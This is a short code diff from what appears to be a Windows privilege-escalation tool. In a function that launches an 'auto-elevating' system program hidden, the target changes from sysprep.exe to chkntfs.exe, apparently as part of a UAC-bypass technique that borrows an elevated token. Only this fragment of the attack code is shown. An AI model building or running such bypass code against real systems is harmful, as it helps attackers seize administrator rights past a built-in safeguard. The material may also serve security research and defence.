@@ -185,7 +185,8 @@ bool token_manipulation::launch_auto_elevating_app(safe_handle& process_handle)
 	shinfo.cbSize = sizeof(SHELLEXECUTEINFOW);
 	shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
 	shinfo.nShow = SW_HIDE;
-	shinfo.lpFile = L"C:\\Windows\\System32\\sysprep\\sysprep.exe";
+	shinfo.lpFile = L"C:\\Windows\\System32\\sysprep\\sysprep.exe"; //deprecated
+	shinfo.lpFile = L"C:\\Windows\\system32\\chkntfs.exe";
 	shinfo.lpVerb = L"open";
 
 	if (!ShellExecuteExW(&shinfo))
